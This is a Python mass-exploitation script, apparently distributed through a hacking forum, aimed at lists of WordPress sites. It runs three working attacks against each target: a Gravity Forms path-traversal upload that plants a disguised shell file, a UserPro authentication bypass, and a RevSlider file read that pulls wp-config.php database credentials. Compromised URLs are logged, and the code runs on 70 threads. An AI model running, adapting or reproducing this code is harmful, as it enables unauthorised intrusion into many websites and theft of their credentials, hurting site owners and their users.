# -*- coding: utf-8 -*-

import requests, os, sys, codecs
from multiprocessing.dummy import Pool
from time import time as timer
import time
from random import sample as rand
from platform import system
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)

####### Colors ######
fr  =   Fore.RED
fc  =   Fore.YELLOW
fw  =   Fore.GREEN
fg  =   Fore.BLUE
sd  =   Style.BRIGHT
sn  =   Style.NORMAL
sb  =   Style.BRIGHT
####################### 

try:
    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))

try:
    os.mkdir('Results')
except:
    pass

def banners():


	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		
print("""
 ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
 ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
 ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
 ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
.++════════════════════════════════════════════════════════════════════════════════════════════════════════++.

                                               Author: Cikus!

                 Wordpress Mass Exploiter: Gravitys Form (Uploader) | Userprobypass | Wordpress Config.
                                         Forum: https://dragonforce.io
                                   Telegram: https://telegram.me/dragonforceio

                                 Get Started With (pip install -r requirements.txt)
                             Usage: python Eksepeloit.py list.txt (Include http/https)

                                          Nota Tapak Kaki :-
                     Saya tidak akan bertanggungjawab atas kerosakan langsung atau
                       tidak langsung yang disebabkan oleh penggunaan alat ini.

.++════════════════════════════════════════════════════════════════════════════════════════════════════════++.""")


# Custom shell/uploader sendiri kat sini #
shell = """Priv8 Uploaders"""

# Suka hati awak ler nak rename apa #
filename = "cikus.gif"

def rand_str (len = None) :
	if len == None :
		len = 8
	return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))
	

def ExploitS(url):
    try:
		
		

		
		
		##### Gravity Forms #####
		
		
		appgrav  = {'field_id':'3',
		'form_id':'1',
		'gform_unique_id':'../../../',
		'name':'cikus.phtml'}
		
		
		Grav = {'file':(filename, shell, 'text/html')}
		
		Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
		
		Gravlib = requests.get(url+'/wp-content/uploads/_input_3_cikus.phtml')
		
		
		if 'Priv8 Uploaders' in Gravlib.content:
			print '[{}Wordpress]: {}{} => {}{} Gravitys {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Results/Shells.txt', 'a').write(url+'/wp-content/uploads/_input_3_cikus.phtml'+'\n')
		else:
			print '[{}Wordpress]: {}{} => {}{} Gravitys {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)			
			
			
		##### Userpro Bypass #####		
			
		azirevlib = requests.get(url+"/?up_auto_log=true")
				
		if 'Password' in azirevlib.content:
			print '[{}Wordpress]: {}{} => {}{} UserPro Bypass {}{} Bypasser!  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Results/Bypasser.txt', 'a').write(url+'/?up_auto_log=true'+'\n')
		else:
			print '[{}Wordpress]: {}{} => {}{} UserPro Bypass {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
			
		##### Revslider Config #####
		
		revlib = requests.get(url+"/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
				
		if 'DB_USER' in revlib.content:
			print '[{}Wordpress]: {}{} => {}{} Revslider Configs {}{} Configurations!  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Results/Configurations.txt', 'a').write(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'+'\n')
		else:
			print '[{}Wordpress]: {}{} => {}{} Revslider Configs {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)		
			


			
    except:
        pass



		
banners()

	
def Main():
    try:
		
        start = timer()
        ThreadPool = Pool(70)
        Threads = ThreadPool.map(ExploitS, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()
